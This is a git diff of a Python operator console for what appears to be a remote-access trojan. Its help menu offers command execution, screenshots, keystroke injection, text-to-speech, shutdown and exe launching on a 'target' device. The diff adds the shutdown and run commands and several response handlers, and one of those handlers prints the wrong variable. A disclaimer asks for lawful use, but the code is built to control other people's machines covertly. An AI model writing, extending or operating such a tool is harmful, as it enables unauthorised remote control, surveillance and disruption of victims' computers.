@@ -2,7 +2,6 @@ import socket
 import io
 from rich import print
 import pyfiglet
-import pyttsx3
 import time
 import os
 import random
@@ -10,22 +9,26 @@ from rich.console import Console
 time.sleep(1)
 console = Console()
 help_menu = """
-╔══════════════════════════════════════════════════════════════╗
-║                   COMMAND REFERENCE GUIDE                   ║
-╠══════════════════════════════════════════════════════════════╣
+╔════════════════════════════════════════════════════════════╗
+║                   COMMAND REFERENCE GUIDE                  ║
+╠════════════════════════════════════════════════════════════╣
 ║                                                            ║
 ║  speak <text>     → Convert text to speech on target       ║
 ║  press <key>      → Simulate a single key press            ║
-║                    👉 win, enter, tab, esc, shift, ctrl     ║
+║                    👉 win, enter, tab, esc, shift, ctrl    ║
 ║  hotkey <k1>+<k2> → Keyboard shortcut (e.g. win+d)         ║
 ║  write <text>     → Type text automatically                ║
-║  cmd <command>    → Execute CMD/PowerShell commands         ║
-║  ss               → Capture target screenshot               ║
-║  help             → Show this help menu                     ║
-║  clear            → Clear terminal screen                   ║
-║  exit             → Disconnect and exit                     ║
+║  cmd <command>    → Execute CMD/PowerShell commands        ║
+║  ss               → Capture target screenshot              ║
+║  help             → Show this help menu                    ║
+║  clear            → Clear terminal screen                  ║
+║  exit             → Disconnect and exit                    ║
+║  shutdown         → Shutdown The Target device             ║                                         
+║  run (file_path.exe) →    Runs The specific exe file       ║
+║                            on target device with the help  ║
+║                            of file path                    ║                                                                                ║
 ║                                                            ║
-╚══════════════════════════════════════════════════════════════╝
+╚════════════════════════════════════════════════════════════╝
 """
 
 # Disclaimer
@@ -42,7 +45,6 @@ disclaimer= """
 """
 
 print(f"[red]{disclaimer}[/red]")
-pyttsx3.speak(disclaimer)
 time.sleep(1)
 
 before = """📌 BEFORE RUNNING
@@ -55,7 +57,6 @@ Use this software responsibly and only for lawful and ethical purposes.
 """
 
 print(f"[blue]{before}[/blue]")
-pyttsx3.speak(before)
 time.sleep(1)
 
 run = str(input("Do you want to run this tool (y/n) : ")).lower()
@@ -123,6 +124,22 @@ if run == "y":
                 if cmd.startswith("cmd"):
                      output = client.recv(10240).decode("utf-8")
                      print(output)
+                if cmd.startswith("press"):
+                    output1 = client.recv(1024).decode("utf-8")
+                    print(f"[bold green]{output1}[bold green]")
+                if cmd.startswith("write"):
+                    output2 = client.recv(1024).decode("utf-8")
+                    print(f"[bold green]{output2}[bold green]")
+                if cmd.startswith("hotkey"):
+                    output3 = client.recv(1024).decode("utf-8")
+                    print(f"[bold green]{output3}[bold green]")
+                if cmd.startswith("speak"):
+                    output4 = client.recv(1024).decode("utf-8")
+                    print(f"[bold green]{output4}[bold green]")
+                if cmd.startswith("shutdown"):
+                    output5 = client.recv(1024).decode("utf-8")
+                    print(f"[bold green]{output4}[bold green]")
+
         except Exception as e:
             print(f"Error : {e}")    
     client.close()
